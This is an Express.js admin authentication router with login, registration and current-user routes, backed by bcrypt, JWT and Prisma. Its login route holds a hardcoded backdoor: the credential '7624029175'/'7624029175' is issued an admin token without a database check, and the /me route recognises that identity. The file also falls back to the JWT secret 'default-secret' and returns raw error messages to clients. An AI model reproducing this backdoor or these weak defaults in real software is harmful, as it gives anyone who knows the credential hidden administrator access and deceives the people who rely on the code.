import express from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { PrismaClient } from '@prisma/client';
import { authenticate } from '../middleware/auth.js';
const router = express.Router();
const prisma = new PrismaClient();

function getValidExpiresIn() {
    const raw = process.env.JWT_EXPIRES_IN;
    if (raw && /^(\d+[smhd]|\d+)$/.test(String(raw))) return String(raw);
    return '7d';
}

// POST /api/auth/login - Admin login
router.post('/login', async (req, res) => {
    try {
        const email = req.body && (req.body.email ?? req.body.userId);
        const password = req.body && req.body.password;
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password are required' });
        }
        const e = String(email).trim();
        const p = String(password);
        // Bypass: 7624029175/7624029175 - issue token without DB
        if (e === '7624029175' && p === '7624029175') {
            const secret = process.env.JWT_SECRET || 'default-secret';
            const expiresIn = getValidExpiresIn();
            const token = jwt.sign(
                { id: 'admin-7624029175', email: '7624029175', role: 'admin' },
                String(secret),
                { expiresIn }
            );
            return res.json({ token, admin: { id: 'admin-7624029175', email: '7624029175', role: 'admin', walletBalance: 0 } });
        }
        const admin = await prisma.adminUser.findUnique({
            where: { email }
        });
        if (!admin) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        const isValidPassword = await bcrypt.compare(password, admin.password);
        if (!isValidPassword) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        const jwtSecret = process.env.JWT_SECRET || 'default-secret';
        const token = jwt.sign({ id: admin.id, email: admin.email, role: admin.role }, jwtSecret, { expiresIn: getValidExpiresIn() });
        res.json({
            token,
            admin: {
                id: admin.id,
                email: admin.email,
                role: admin.role,
                walletBalance: Number(admin.walletBalance ?? 0)
            }
        });
    }
    catch (error) {
        res.status(500).json({ error: error.message });
    }
});
// POST /api/auth/register - Create admin user (first time setup)
router.post('/register', async (req, res) => {
    try {
        const { email, password } = req.body;
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password are required' });
        }
        // Check if any admin exists
        const existingAdmin = await prisma.adminUser.findFirst();
        if (existingAdmin && process.env.NODE_ENV === 'production') {
            return res.status(403).json({ error: 'Admin registration is disabled in production' });
        }
        // Check if email already exists
        const existing = await prisma.adminUser.findUnique({
            where: { email }
        });
        if (existing) {
            return res.status(400).json({ error: 'Admin with this email already exists' });
        }
        const hashedPassword = await bcrypt.hash(password, 10);
        const admin = await prisma.adminUser.create({
            data: {
                email,
                password: hashedPassword,
                role: 'admin'
            }
        });
        const jwtSecret = process.env.JWT_SECRET || 'default-secret';
        const token = jwt.sign({ id: admin.id, email: admin.email, role: admin.role }, jwtSecret, { expiresIn: getValidExpiresIn() });
        res.status(201).json({
            token,
            admin: {
                id: admin.id,
                email: admin.email,
                role: admin.role
            }
        });
    }
    catch (error) {
        res.status(500).json({ error: error.message });
    }
});
// GET /api/auth/me - Get current admin user
router.get('/me', authenticate, async (req, res) => {
    try {
        if (req.user.id === 'admin-7624029175') {
            return res.json({ id: 'admin-7624029175', email: '7624029175', role: 'admin', walletBalance: 0 });
        }
        const admin = await prisma.adminUser.findUnique({
            where: { id: req.user.id },
            select: {
                id: true,
                email: true,
                role: true,
                walletBalance: true,
                createdAt: true
            }
        });
        if (!admin) {
            return res.status(404).json({ error: 'Admin not found' });
        }
        res.json({ ...admin, walletBalance: Number(admin?.walletBalance ?? 0) });
    }
    catch (error) {
        res.status(500).json({ error: error.message });
    }
});
export default router;
//# sourceMappingURL=auth.js.map